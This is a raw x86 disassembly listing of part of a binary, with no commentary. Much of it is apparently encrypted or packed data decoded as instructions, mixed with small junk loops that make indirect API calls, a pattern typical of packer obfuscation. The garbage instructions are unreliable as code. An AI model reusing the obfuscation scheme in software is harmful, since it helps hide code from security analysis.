  40e1f0:	jg     0x40e1a7
  40e1f2:	sbb    bl,dh
  40e1f4:	dec    edx
  40e1f5:	dec    eax
  40e1f6:	cmp    DWORD PTR [ebp-0x74],0x46fd8c3b
  40e1fd:	test   eax,0x66bc141e
  40e202:	(bad)  
  40e204:	dec    eax
  40e205:	iret   
  40e206:	gs ret 
  40e208:	das    
  40e209:	mov    bh,0x32
  40e20b:	out    0xfe,al
  40e20d:	data16 sti 
  40e20f:	xchg   ebp,eax
  40e210:	lea    eax,[eax+0x35]
  40e213:	dec    eax
  40e214:	mov    ds:0xf6a1d9d6,al
  40e219:	sbb    DWORD PTR [ebp-0x4f],edi
  40e21c:	ja     0x40e21e
  40e21e:	mov    ecx,ebp
  40e220:	or     bl,dh
  40e222:	hlt    
  40e223:	or     al,0xdb
  40e225:	dec    edx
  40e226:	xor    BYTE PTR [edx+0x634b34f6],ah
  40e22c:	dec    edi
  40e22d:	not    DWORD PTR [edx]
  40e22f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e230:	(bad)  
  40e231:	int3   
  40e232:	shl    DWORD PTR [ecx+0x47],0x5b
  40e236:	or     ah,cl
  40e238:	lea    esp,[eax-0x27fa333b]
  40e23e:	mov    edi,0x228e14d4
  40e243:	fstp   DWORD PTR [esi-0x68]
  40e246:	lahf   
  40e247:	pusha  
  40e248:	adc    eax,DWORD PTR ds:[eax-0x3b38ed21]
  40e24f:	adc    eax,DWORD PTR [ebp-0x648614cc]
  40e255:	inc    edi
  40e256:	lods   eax,DWORD PTR ds:[esi]
  40e257:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e258:	imul   eax,DWORD PTR [edx*8-0xe05c45e],0x1e6c88b0
  40e263:	bound  ebx,QWORD PTR [edx+0x28]
  40e266:	fwait
  40e267:	loop   0x40e222
  40e269:	and    esp,eax
  40e26b:	dec    ecx
  40e26c:	mov    WORD PTR [ebp+0x25f695f],es
  40e272:	ins    BYTE PTR es:[edi],dx
  40e273:	xchg   DWORD PTR [edx+0x5ffc574c],ebp
  40e279:	mov    DWORD PTR [ecx],eax
  40e27b:	lea    eax,[ebp-0x4]
  40e27e:	and    DWORD PTR ds:0x42fd7d,0x0
  40e288:	mov    ecx,DWORD PTR ds:0x42fd7d
  40e28e:	inc    ecx
  40e28f:	mov    DWORD PTR ds:0x42fd7d,ecx
  40e295:	cmp    DWORD PTR ds:0x42fd7d,0x8
  40e29c:	jne    0x40e2b0
  40e2a2:	push   DWORD PTR [ebp-0x14]
  40e2a5:	push   0x5961
  40e2aa:	call   DWORD PTR ds:0x42e5e3
  40e2b0:	cmp    DWORD PTR ds:0x42fd7d,0x7
  40e2b7:	jne    0x40e2ca
  40e2bd:	mov    ecx,DWORD PTR ds:0x42fd7d
  40e2c3:	inc    ecx
  40e2c4:	mov    DWORD PTR ds:0x42fd7d,ecx
  40e2ca:	cmp    DWORD PTR ds:0x42fd7d,0x15
  40e2d1:	jb     0x40e288
  40e2d7:	and    DWORD PTR ds:0x42fdee,0x0
  40e2e1:	jmp    0x40e2f3
  40e2e6:	mov    ecx,DWORD PTR ds:0x42fdee
  40e2ec:	inc    ecx
  40e2ed:	mov    DWORD PTR ds:0x42fdee,ecx
  40e2f3:	cmp    DWORD PTR ds:0x42fdee,0x1b
  40e2fa:	jae    0x40e34c
  40e300:	cmp    DWORD PTR ds:0x42fdee,0x9
  40e307:	jne    0x40e31b
  40e30d:	push   DWORD PTR [ebp-0x28]
  40e310:	push   0x42fd81
  40e315:	call   DWORD PTR ds:0x42e4f7
  40e31b:	cmp    DWORD PTR ds:0x42fdee,0x8
  40e322:	jne    0x40e335
  40e328:	mov    ecx,DWORD PTR ds:0x42fdee
  40e32e:	inc    ecx
  40e32f:	mov    DWORD PTR ds:0x42fdee,ecx
  40e335:	jmp    0x40e2e6
  40e33a:	mov    ebx,DWORD PTR ds:0x42e814
  40e340:	mov    ecx,DWORD PTR ds:0x42e81c
  40e346:	sub    ebx,ecx
  40e348:	imul   ebx,DWORD PTR [ebx+ecx*1]
  40e34c:	mov    DWORD PTR [ebp-0x10],eax
  40e34f:	sub    ecx,ebx
  40e351:	mov    eax,DWORD PTR [ebp+0x8]
  40e354:	and    ebx,ecx
  40e356:	mov    ecx,DWORD PTR [ebp-0x10]
  40e359:	sbb    DWORD PTR ds:0x42fdf2,ecx
  40e35f:	xor    eax,esi
  40e361:	add    eax,edi
  40e363:	mov    DWORD PTR [ecx],eax
  40e365:	jmp    0x40e4cf
  40e36a:	icebp  
  40e36b:	ja     0x40e334
  40e36d:	pop    ds
  40e36e:	inc    ecx
  40e36f:	scas   eax,DWORD PTR es:[edi]
  40e370:	icebp  
  40e371:	jno    0x40e314
  40e373:	push   edi
  40e374:	inc    eax
  40e375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e376:	or     BYTE PTR [eax],ah
  40e378:	fisub  DWORD PTR ds:0x7070a43b
  40e37e:	ret    
  40e37f:	jg     0x40e3f1
  40e381:	jo     0x40e37e
  40e383:	imul   esi,ecx,0x53
  40e386:	xchg   esp,eax
  40e387:	jl     0x40e3cb
  40e389:	cmp    bl,BYTE PTR [esi+0x65]
  40e38c:	sti    
  40e38d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e38e:	daa    
  40e38f:	(bad)  [eax]
  40e391:	test   dl,dl
  40e393:	es push esi
  40e395:	or     dh,BYTE PTR [ebx-0x5659db9f]
  40e39b:	add    ch,dl
  40e39d:	jecxz  0x40e375
  40e39f:	fsubr  st(4),st
  40e3a1:	pushf  
  40e3a2:	fisub  WORD PTR [edi]
  40e3a4:	aaa    
  40e3a5:	shl    DWORD PTR [edi+0x58],0x6a
  40e3a9:	xor    BYTE PTR [edx],0xda
  40e3ac:	xor    BYTE PTR [ecx],bl
  40e3ae:	in     al,dx
  40e3af:	add    bl,BYTE PTR [edi-0x21814290]
  40e3b5:	loopne 0x40e343
  40e3b7:	jg     0x40e39e
  40e3b9:	mov    esi,0x857d41e0
  40e3be:	gs (bad) 
  40e3c0:	jne    0x40e3bb
  40e3c2:	push   edx
  40e3c3:	jle    0x40e350
  40e3c5:	xchg   ebx,eax
  40e3c6:	or     DWORD PTR [ebp-0x1289fe29],edi
  40e3cc:	dec    ebx
  40e3cd:	mov    eax,ds:0x924dde97
  40e3d2:	test   BYTE PTR [eax-0x26f668de],0x5
  40e3d9:	xchg   BYTE PTR [edx*2-0x507acc09],cl
  40e3e0:	(bad)  
  40e3e1:	fisubr WORD PTR [edx-0x7c477151]
  40e3e7:	mov    eax,0xdd4c23d
  40e3ec:	xchg   ebp,eax
  40e3ed:	push   0x12d3be01
  40e3f2:	mov    DWORD PTR [ecx-0x1c26873f],ebp
  40e3f8:	xchg   ebx,eax
  40e3f9:	je     0x40e473
  40e3fb:	fst    QWORD PTR [ecx+0x75]
  40e3fe:	(bad)  
  40e3ff:	jl     0x40e3c2
  40e401:	imul   edx,esp,0x782d8ab4
  40e407:	jmp    0x40e41f
  40e409:	fistp  DWORD PTR [edi+eax*2+0x7f]
  40e40d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e40e:	lods   eax,DWORD PTR ds:[esi]
  40e40f:	arpl   WORD PTR [edx-0x5d],sp
  40e412:	pop    es
  40e413:	cmp    al,0xc3
  40e415:	aas    
  40e416:	xor    bl,al
  40e418:	xchg   edx,eax
  40e419:	call   0xab26:0x6372438f
  40e420:	fwait
  40e421:	fwait
  40e422:	call   0xb2b7e3f4
  40e427:	ds and al,0x0
  40e42a:	xor    eax,0xe648c722
  40e42f:	ja     0x40e488
  40e431:	loopne 0x40e4b2
  40e433:	fs sbb cl,0x7d
  40e437:	jo     0x40e497
  40e439:	fsub   DWORD PTR [edx+0x116a1054]
  40e43f:	pusha  
  40e440:	push   0xaaa25340
  40e445:	call   0xf9653226
  40e44a:	sub    bl,BYTE PTR [ecx-0x7f819923]
  40e450:	ja     0x40e413
  40e452:	in     eax,0x3d
  40e454:	jl     0x40e4a2
  40e456:	rcl    dh,1
  40e458:	push   edx
  40e459:	jmp    0x40e3f8
  40e45b:	xor    bh,bh
  40e45d:	mov    dl,0x81
  40e45f:	mov    eax,0x4b17685b
  40e464:	outs   dx,DWORD PTR ds:[esi]
  40e465:	mov    ch,0xcc
  40e467:	popa   
  40e468:	outs   dx,BYTE PTR ds:[esi]
  40e469:	out    0x41,eax
  40e46b:	mov    ecx,DWORD PTR [ebp-0x45404d57]
  40e471:	push   0xffffffd1
  40e473:	shl    BYTE PTR [ebx-0x4bf6ec4e],0x28
  40e47a:	fwait
  40e47b:	clc    
  40e47c:	jl     0x40e4c9
  40e47e:	inc    esi
  40e47f:	push   ds
  40e480:	or     edi,DWORD PTR [ebp+0x1e4f5cc2]
  40e486:	ret    
  40e487:	jg     0x40e422
  40e489:	mov    bh,0xe
  40e48b:	add    DWORD PTR [ecx+0x18],0xaa3f85c0
  40e492:	push   eax
  40e493:	pop    esi
  40e494:	outs   dx,BYTE PTR ds:[esi]
  40e495:	and    esp,DWORD PTR [edx-0x6dd4f6c9]
  40e49b:	push   es
  40e49c:	inc    edi
  40e49d:	loop   0x40e513
  40e49f:	mov    WORD PTR [edi],fs
  40e4a1:	test   al,0xcd
  40e4a3:	scas   al,BYTE PTR es:[edi]
  40e4a4:	dec    esp
  40e4a5:	sbb    eax,0xd61999ba
  40e4aa:	push   0xeb6503d1
  40e4af:	jb     0x40e51f
  40e4b1:	xor    bl,al
  40e4b3:	cmp    al,bh
  40e4b5:	nop
  40e4b6:	sbb    ah,BYTE PTR [ebx-0x2d]
  40e4b9:	mov    ds:0x22fa78c3,al
  40e4be:	loopne 0x40e480
  40e4c0:	lock js 0x40e44a
  40e4c3:	aaa    
  40e4c4:	mov    eax,DWORD PTR [edx+esi*8-0x42ec06ff]
  40e4cb:	imul   eax,esp,0x45c78d34
  40e4d1:	call   0xf8dd6a07
  40e4d6:	and    ebx,0x399a
  40e4dc:	lea    eax,[ebp-0x18]
  40e4df:	mov    DWORD PTR [ebp-0x24],eax
  40e4e2:	jmp    0x40e64c
  40e4e7:	ror    DWORD PTR [eax+edi*4+0x61f15519],0x74
  40e4ef:	sbb    al,BYTE PTR ds:0xc8b4740f
  40e4f5:	xchg   ebx,eax
  40e4f6:	cmp    al,0x8e
  40e4f8:	mov    ds:0x7fc37070,eax
  40e4fd:	jo     0x40e56f
  40e4ff:	sub    ebp,DWORD PTR [ebx+0x1ec4a9b2]
  40e505:	xlat   BYTE PTR ds:[ebx]
  40e506:	leave  
  40e507:	sbb    cl,BYTE PTR [ebx+edx*1+0x4a96c90]
  40e50e:	mov    bl,0x4a
  40e510:	mov    WORD PTR [edi+0x13],cs
  40e513:	pop    ecx
  40e514:	(bad)  
  40e515:	fwait
  40e516:	addr16 inc eax
  40e518:	mov    ebp,0x552e6461
  40e51d:	xchg   edx,eax
  40e51e:	fmul   st(1),st
  40e520:	sub    DWORD PTR [ebx-0x1553ed61],0x0
  40e527:	mov    dl,0x6a
  40e529:	scas   al,BYTE PTR es:[edi]
  40e52a:	neg    al
  40e52c:	add    bh,al
  40e52e:	xchg   BYTE PTR [ecx-0x47],al
  40e531:	test   BYTE PTR [ebp+0x6ffa99a7],dl
  40e537:	mov    dh,0xca
  40e539:	inc    esi
  40e53a:	jl     0x40e537
  40e53c:	jbe    0x40e5b0
  40e53e:	xchg   ebx,eax
  40e53f:	sub    BYTE PTR [ecx-0x231a4867],bl
  40e545:	inc    esi
  40e546:	cmp    DWORD PTR [bp+si-0x4d53],0xffffffa1
  40e54c:	pop    ss
  40e54d:	aad    0x54
  40e54f:	mov    esp,0x55660e90
  40e554:	add    edi,DWORD PTR [esi]
  40e556:	push   esp
  40e557:	aas    
  40e558:	in     al,0x91
  40e55a:	aas    
  40e55b:	dec    edi
  40e55c:	sub    al,0xb7
  40e55e:	push   cs
  40e55f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e560:	or     eax,0x35aed33e
  40e565:	lea    ecx,[esi+edx*2-0x13225122]
  40e56c:	outs   dx,DWORD PTR ds:[esi]
  40e56d:	mov    edx,0x957b86c7
  40e572:	pop    es
  40e573:	mov    BYTE PTR [eax+0x7f5e8e9e],al
  40e579:	outs   dx,BYTE PTR ds:[esi]
  40e57a:	neg    bh
  40e57c:	int3   
  40e57d:	loope  0x40e53f
  40e57f:	push   ebp
  40e580:	div    BYTE PTR [edx+edi*2]
  40e583:	add    eax,0xbe8b9d12
  40e588:	lock adc al,0xb7
  40e58b:	pop    edx
  40e58c:	es out dx,eax
  40e58e:	les    eax,FWORD PTR [edi-0x2a]
  40e591:	jge    0x40e599
  40e593:	fdivp  st(3),st
  40e595:	mov    ecx,0xe3e1d09c
  40e59a:	adc    BYTE PTR [edi],bl
  40e59c:	cld    
  40e59d:	add    BYTE PTR [edi],cl
  40e59f:	dec    ebp
  40e5a0:	adc    DWORD PTR [eax],ebp
  40e5a2:	in     al,dx
  40e5a3:	fs int3 
  40e5a5:	mov    gs,ebp
  40e5a7:	les    esp,FWORD PTR [eax-0x5b3a2631]
  40e5ad:	xor    bh,ah
  40e5af:	jne    0x40e618
  40e5b1:	arpl   sp,cx
  40e5b3:	test   dh,0x60
  40e5b6:	mov    bh,0x2d
  40e5b8:	sbb    esi,DWORD PTR [ecx]
  40e5ba:	loopne 0x40e5ef
  40e5bc:	mov    edi,0x3db7925
  40e5c1:	retf   
  40e5c2:	arpl   WORD PTR [edi+0x63ffdc00],bp
  40e5c8:	nop
  40e5c9:	sbb    ah,BYTE PTR [edi]
  40e5cb:	call   0x17e6f5cf
  40e5d0:	xchg   esi,eax
  40e5d1:	jne    0x40e592
  40e5d3:	fnstcw WORD PTR [edx+0x3367cd9]
  40e5d9:	jmp    0xaccb:0x6aa5d16e
  40e5e0:	mov    ch,0x79
  40e5e2:	mov    ebp,0xa6f80826
  40e5e7:	call   0xf2be:0x3ed84cbc
  40e5ee:	add    al,0x47
  40e5f0:	(bad)  
  40e5f1:	cmp    DWORD PTR cs:[edx+ecx*1],eax
  40e5f5:	bound  edx,QWORD PTR [ebp+0x2e481ffc]
  40e5fb:	loope  0x40e606
  40e5fd:	popf   
  40e5fe:	sub    DWORD PTR [ecx+0x37],0x74e8b124
  40e605:	or     al,0xe5
  40e607:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e608:	mov    BYTE PTR [ebx+0x3c76ebe0],bl
  40e60e:	xchg   ecx,eax
  40e60f:	scas   al,BYTE PTR es:[edi]
  40e610:	jl     0x40e67d
  40e612:	adc    al,0xd1
  40e614:	mov    dl,BYTE PTR [eax+0x5c1583b3]
  40e61a:	mov    DWORD PTR [esi+0x66],ecx
  40e61d:	test   BYTE PTR [edi+0x23],bh
  40e620:	frstor [edx+0x56]
  40e623:	sbb    DWORD PTR [eax+ebp*4-0x41059eb1],esp
  40e62a:	jo     0x40e613
  40e62c:	xor    dh,BYTE PTR [ebx]
  40e62e:	ins    DWORD PTR es:[edi],dx
  40e62f:	adc    BYTE PTR [eax+0x50fb02c8],dh
  40e635:	out    dx,al
  40e636:	mov    dl,0x60
  40e638:	jno    0x40e64a
  40e63a:	sahf   
  40e63b:	xor    BYTE PTR ds:0x5eb8b0e,bl
  40e641:	inc    eax
  40e642:	idiv   BYTE PTR [ebx-0x5a]
  40e645:	pop    esi
  40e646:	dec    eax
  40e647:	mov    al,0xa5
  40e649:	stos   BYTE PTR es:[edi],al
  40e64a:	(bad)  
  40e64b:	xor    al,0x8b
  40e64d:	inc    ebp
  40e64e:	call   0xfe3b0bd4
  40e653:	inc    edx
  40e654:	add    BYTE PTR [eax],al
  40e656:	add    BYTE PTR [eax],al
  40e658:	add    cl,ch
  40e65a:	or     eax,0x8b000000
  40e65f:	sbb    eax,0x42fdfa
  40e664:	inc    ebx
  40e665:	mov    DWORD PTR ds:0x42fdfa,ebx
  40e66b:	cmp    DWORD PTR ds:0x42fdfa,0x1e
  40e672:	jae    0x40e697
  40e678:	cmp    DWORD PTR ds:0x42fdfa,0x24
  40e67f:	jne    0x40e690
  40e685:	push   0x1cae
  40e68a:	call   DWORD PTR ds:0x42e4fb
  40e690:	jmp    0x40e65e
  40e695:	neg    ebx
  40e697:	mov    ecx,DWORD PTR [ebp-0x24]
  40e69a:	add    ebx,0x74bf
  40e6a0:	xor    eax,esi
  40e6a2:	add    eax,edi
  40e6a4:	sub    DWORD PTR ds:0x42e19c,edx
  40e6aa:	mov    DWORD PTR [ecx],eax
  40e6ac:	mov    eax,ds:0x41b27c
  40e6b1:	adc    DWORD PTR ds:0x42fd81,ebx
  40e6b7:	mov    ebx,0x8e12febe
  40e6bc:	mov    DWORD PTR [ebp-0xc],ebx
  40e6bf:	adc    DWORD PTR ds:0x42fd59,0x7944
  40e6c9:	jmp    0x40e833
  40e6ce:	cmp    dl,bl
  40e6d0:	in     al,dx
  40e6d1:	fcomi  st,st(1)
  40e6d3:	jecxz  0x40e69e
  40e6d5:	icebp  
  40e6d6:	xor    al,0x3a
  40e6d8:	iret   
  40e6d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6da:	jg     0x40e695
  40e6dc:	test   DWORD PTR [esi+0x7070a251],0x70707fc3
  40e6e6:	sbb    edi,eax
  40e6e8:	push   edi
  40e6e9:	test   DWORD PTR [edx+0x5d],eax
  40e6ec:	out    dx,eax
  40e6ed:	xchg   esp,eax
  40e6ee:	jg     0x40e6e2
  40e6f0:	add    eax,0x93f68cfb
  40e6f5:	(bad)  
  40e6f6:	mov    dl,0x48
  40e6f8:	cwde   
  40e6f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6fa:	mov    gs,WORD PTR [edx+0xb7496b7]
  40e700:	out    dx,eax
  40e701:	nop
  40e702:	pop    edx
  40e703:	rcl    BYTE PTR [ebx+0x9],1
  40e706:	sbb    ch,BYTE PTR [ebp+0x11765efc]
  40e70c:	retf   0x1f25
  40e70f:	mov    bl,0x12
  40e711:	adc    al,0xf3
  40e713:	sahf   
  40e714:	ret    0xb5a1
  40e717:	fidivr WORD PTR [ebx-0x3b]
  40e71a:	retf   
  40e71b:	stos   BYTE PTR es:[edi],al
  40e71c:	aaa    
  40e71d:	ficomp DWORD PTR [edi]
  40e71f:	xchg   esi,eax
  40e720:	and    al,BYTE PTR [ecx+0x41]
  40e723:	lods   eax,DWORD PTR ds:[esi]
  40e724:	cdq    
  40e725:	sbb    bl,ch
  40e727:	mov    WORD PTR [edx+0x5daba6],es
  40e72d:	pop    es
  40e72e:	pop    edi
  40e72f:	inc    eax
  40e730:	add    eax,ebx
  40e732:	push   ecx
  40e733:	cdq    
  40e734:	rol    BYTE PTR [edi],0xf0
  40e737:	pop    eax
  40e738:	outs   dx,DWORD PTR ds:[esi]
  40e739:	xchg   edx,eax
  40e73a:	bound  ebp,QWORD PTR [ebx]
  40e73c:	xchg   ebp,eax
  40e73d:	not    BYTE PTR [edi+edi*2]
  40e740:	cdq    
  40e741:	test   BYTE PTR [ecx+ebp*1],ch
  40e744:	xor    BYTE PTR [edx-0x869ce1f],dh
  40e74a:	enter  0x21ec,0x13
  40e74e:	jno    0x40e7cb
  40e750:	adc    BYTE PTR [edx],ah
  40e752:	sub    BYTE PTR [edi+0x3ccd6ebd],ah
  40e758:	mov    edx,0xa5982387
  40e75d:	mov    bh,BYTE PTR [ebx-0x52]
  40e760:	(bad)  
  40e762:	and    ebx,0xffffff87
  40e765:	xchg   esi,eax
  40e766:	fcomp  QWORD PTR [ecx]
  40e768:	pop    ds
  40e769:	mov    ah,0x4f
  40e76b:	sti    
  40e76c:	mov    dl,0x7e
  40e76e:	aad    0x70
  40e770:	loopne 0x40e769
  40e772:	and    al,BYTE PTR [ecx+0x60628c7c]
  40e778:	xor    ebx,ebx
  40e77a:	mov    esp,0x3a92087a
  40e77f:	adc    dl,BYTE PTR [ebx+esi*2-0x1971431]
  40e786:	or     bl,BYTE PTR gs:0x9316723b
  40e78d:	sub    eax,0x58218066
  40e792:	pop    ecx
  40e793:	addr16 in al,dx
  40e795:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e796:	xor    DWORD PTR [ebp-0x7a247849],ebp
  40e79c:	repnz xchg esp,eax
  40e79e:	(bad)  
  40e79f:	or     ch,dl
  40e7a1:	or     DWORD PTR [edi],esp
  40e7a3:	xchg   esp,eax
  40e7a4:	xchg   esi,eax
  40e7a5:	(bad)  
  40e7a6:	fwait
  40e7a7:	lock push ds
  40e7a9:	jmp    DWORD PTR [ecx]
  40e7ab:	sbb    esi,DWORD PTR [ecx+0x3b]
  40e7ae:	mov    edi,0x8fa8c055
  40e7b3:	dec    esp
  40e7b4:	or     al,0x65
  40e7b6:	hlt    
  40e7b7:	jne    0x40e771
  40e7b9:	mov    ds:0x497be9b,al
  40e7be:	int3   
  40e7bf:	mov    ah,dh
  40e7c1:	push   es
  40e7c2:	lahf   
  40e7c3:	loopne 0x40e74c
  40e7c5:	cmp    al,ch
  40e7c7:	or     ah,BYTE PTR [edi*2+0x1bbfdb0d]
  40e7ce:	push   edi
  40e7cf:	adc    ch,BYTE PTR ds:0x65035f32
  40e7d5:	inc    ebx
  40e7d6:	dec    eax
  40e7d7:	mov    esi,0xb22b4984
  40e7dc:	retf   0xb54b
  40e7df:	push   edx
  40e7e0:	mov    dl,0xe
  40e7e2:	jbe    0x40e7aa
  40e7e4:	pop    gs
  40e7e6:	mov    al,ds:0x858c8527
  40e7eb:	adc    bl,bh
  40e7ed:	jmp    0xedeb:0xf2e9df3e
  40e7f4:	xor    al,0x92
  40e7f6:	arpl   WORD PTR [ebx+0x3e329bc0],sp
  40e7fc:	bnd ret 0xaa11
  40e800:	sbb    BYTE PTR [edx],ch
  40e802:	aaa    
  40e803:	cmp    al,0x5b
  40e805:	loope  0x40e7de
  40e807:	sbb    eax,0xc4233cd8
  40e80c:	mov    eax,esp
  40e80e:	mov    WORD PTR [edi],cs
  40e810:	daa    
  40e811:	adc    edi,DWORD PTR [esi-0x5baba1c9]
  40e817:	dec    cl
  40e819:	mov    WORD PTR [ecx+0x36fdbcf8],fs
  40e81f:	mov    al,0xf0
  40e821:	(bad)  
  40e822:	mov    bh,0xf1
  40e824:	sub    eax,0xb4f38b43
  40e829:	cli    
  40e82a:	std    
  40e82b:	sub    ecx,DWORD PTR [ebx-0x7b]
  40e82e:	and    cl,BYTE PTR [ebx-0x7483df97]
  40e834:	add    BYTE PTR [ecx+0x42fd6915],al
  40e83a:	add    BYTE PTR [edi+0x50],ah
  40e83d:	add    BYTE PTR [eax],al
  40e83f:	mov    cx,WORD PTR [ebp-0x4]
  40e843:	xor    DWORD PTR ds:0x42fd8d,0x42fdfe
  40e84d:	movzx  ecx,cx
  40e850:	add    ecx,DWORD PTR [eax]
  40e852:	neg    eax
  40e854:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40e85b:	sbb    eax,0x5a1e
  40e860:	mov    DWORD PTR [ebp-0x1c],ecx
  40e863:	mov    eax,DWORD PTR [ebp+0x8]
  40e866:	sbb    ecx,DWORD PTR ds:0x42fd61
  40e86c:	mov    ecx,DWORD PTR [ebp-0x8]
  40e86f:	xor    DWORD PTR ds:0x42e19c,0x42e76f
  40e879:	xor    eax,esi
  40e87b:	and    DWORD PTR ds:0x42e78b,0x57ad
  40e885:	add    eax,edi
  40e887:	cmp    DWORD PTR [ecx],eax
  40e889:	jne    0x40efe4
  40e88f:	and    DWORD PTR ds:0x42fd51,0x0
  40e899:	jmp    0x40e8ab
  40e89e:	mov    ecx,DWORD PTR ds:0x42fd51
  40e8a4:	inc    ecx
  40e8a5:	mov    DWORD PTR ds:0x42fd51,ecx
  40e8ab:	cmp    DWORD PTR ds:0x42fd51,0x11
  40e8b2:	jae    0x40e8fe
  40e8b8:	cmp    DWORD PTR ds:0x42fd51,0x8
  40e8bf:	jne    0x40e8d0
  40e8c5:	push   0x42e267
  40e8ca:	call   DWORD PTR ds:0x42e4ff
  40e8d0:	cmp    DWORD PTR ds:0x42fd51,0x7
  40e8d7:	jne    0x40e8ec
  40e8dd:	xor    ecx,ecx
  40e8df:	add    ecx,DWORD PTR ds:0x42fd51
  40e8e5:	inc    ecx
  40e8e6:	mov    DWORD PTR ds:0x42fd51,ecx
  40e8ec:	jmp    0x40e89e
  40e8f1:	movzx  ecx,BYTE PTR ds:0x42fe0a
  40e8f8:	adc    DWORD PTR ds:0x42e77f,ecx
  40e8fe:	mov    eax,DWORD PTR [ebp+0x8]
  40e901:	xor    DWORD PTR ds:0x42e777,0x70e3
  40e90b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40e90e:	and    DWORD PTR ds:0x42e77b,0x42e76f
  40e918:	xor    eax,esi
  40e91a:	not    DWORD PTR ds:0x42fd81
  40e920:	add    eax,edi
  40e922:	mov    DWORD PTR ds:0x42fd8d,0x37d2
  40e92c:	cmp    DWORD PTR [ecx],eax
  40e92e:	mov    DWORD PTR ds:0x42e78b,0x263d
  40e938:	jmp    0x40eaa2
  40e93d:	(bad)  
  40e93e:	(bad)  
  40e93f:	fistp  DWORD PTR [ebx+0x65445961]
  40e945:	shl    BYTE PTR [edi-0x39],0x63
  40e949:	imul   edx,eax,0x56
  40e94c:	xor    DWORD PTR [eax+eiz*4],esp
  40e94f:	jo     0x40e9c1
  40e951:	ret    
  40e952:	jg     0x40e9c4
  40e954:	jo     0x40e8d6
  40e956:	or     al,0x8a
  40e958:	jg     0x40e947
  40e95a:	out    0xa7,al
  40e95c:	bound  ecx,QWORD PTR [ecx-0x1fb23073]
  40e962:	fnstcw WORD PTR [eax+eax*8+0x316c41cc]
  40e969:	cli    
  40e96a:	in     al,0xa9
  40e96c:	inc    ebp
  40e96d:	scas   eax,DWORD PTR es:[edi]
  40e96e:	(bad)  [esi-0x16773f]
  40e974:	or     ebp,ebp
  40e976:	jg     0x40e9b6
  40e978:	inc    ebp
  40e979:	ds inc ebx
  40e97b:	shl    BYTE PTR [esp+edi*1-0x3e],1
  40e97f:	(bad)  
  40e980:	gs jecxz 0x40e95d
  40e983:	add    cl,BYTE PTR [ebx]
  40e985:	jb     0x40e96c
  40e987:	(bad)  
  40e988:	pop    edi
  40e989:	or     al,0x8b
  40e98b:	stc    
  40e98c:	sbb    al,0xbc
  40e98e:	or     DWORD PTR [esi],ebx
  40e990:	repnz imul esp,DWORD PTR [eax],0xca9e9289
  40e997:	out    dx,eax
  40e998:	dec    edx
  40e999:	sbb    BYTE PTR [edi-0x222cfcda],cl
  40e99f:	mov    cl,0xfb
  40e9a1:	repz in eax,0x92
  40e9a4:	lods   al,BYTE PTR ds:[esi]
  40e9a5:	lods   al,BYTE PTR ds:[esi]
  40e9a6:	out    0x9,al
  40e9a8:	leave  
  40e9a9:	in     eax,0x65
  40e9ab:	dec    eax
  40e9ac:	cwde   
  40e9ad:	inc    esp
  40e9ae:	dec    eax
  40e9af:	sbb    DWORD PTR [ebx-0x7a],esp
  40e9b2:	sub    bh,BYTE PTR [ebx+0x15438387]
  40e9b8:	mov    BYTE PTR [esi-0x7347741],dh
  40e9be:	jne    0x40e950
  40e9c0:	xor    DWORD PTR [esi-0x65b3e1bc],edi
  40e9c6:	adc    esp,DWORD PTR [esi-0x73]
  40e9c9:	sbb    DWORD PTR [eax+ebx*8-0x55],ecx
  40e9cd:	jno    0x40e9fe
  40e9cf:	push   esp
  40e9d0:	arpl   WORD PTR [eax],cx
  40e9d2:	outs   dx,DWORD PTR ds:[esi]
  40e9d3:	inc    edi
  40e9d4:	shl    BYTE PTR [ebx-0x30935dd3],0x9b
  40e9db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9dc:	popf   
  40e9dd:	fs stc 
  40e9df:	dec    ecx
  40e9e0:	mov    WORD PTR [ecx],gs
  40e9e2:	test   DWORD PTR [esi],0x7cff08f1
  40e9e8:	ret    0xaf58
  40e9eb:	inc    ecx
  40e9ec:	outs   dx,DWORD PTR ds:[esi]
  40e9ed:	(bad)  
  40e9ee:	jo     0x40ea67
  40e9f0:	sbb    ebx,DWORD PTR [edx]
  40e9f2:	adc    eax,0x2fdd97a3
  40e9f7:	dec    ebx
  40e9f8:	add    BYTE PTR [eax],ah
  40e9fa:	fistp  DWORD PTR [esi]
  40e9fc:	xchg   DWORD PTR [ecx+0x75],edi
  40e9ff:	into   
  40ea00:	sub    bl,bh
  40ea02:	repnz repnz sti 
  40ea05:	pusha  
  40ea06:	sub    eax,0x459c19bb
  40ea0b:	sbb    al,0x48
  40ea0d:	test   eax,0x37ca5667
  40ea12:	test   BYTE PTR [esi+0x1208f98f],ch
  40ea18:	sub    BYTE PTR [ecx+0x551dcf1b],dl
  40ea1e:	popa   
  40ea1f:	icebp  
  40ea20:	outs   dx,DWORD PTR ds:[esi]
  40ea21:	in     al,0xfd
  40ea23:	ins    DWORD PTR es:[edi],dx
  40ea24:	add    eax,0x59feb2d8
  40ea29:	jbe    0x40ea14
  40ea2b:	in     eax,dx
  40ea2c:	pop    ebx
  40ea2d:	std    
  40ea2e:	cmp    DWORD PTR [esp+ecx*4-0x410b4d60],0x21
  40ea36:	outs   dx,BYTE PTR ds:[esi]
  40ea37:	aad    0x97
  40ea39:	jnp    0x40ea56
  40ea3b:	int    0x1e
  40ea3d:	aad    0xc3
  40ea3f:	(bad)  [ebp-0x6a339ca5]
  40ea45:	test   eax,0x4768f2a
  40ea4a:	xchg   edx,eax
  40ea4b:	sbb    eax,0xb8ba4bc
  40ea50:	jge    0x40ea4a
  40ea52:	aaa    
  40ea53:	or     bl,0x1f
  40ea56:	int    0xa4
  40ea58:	ja     0x40e9fa
  40ea5a:	adc    al,0x5b
  40ea5c:	sbb    eax,0x91398341
  40ea61:	jmp    0x54c88f13
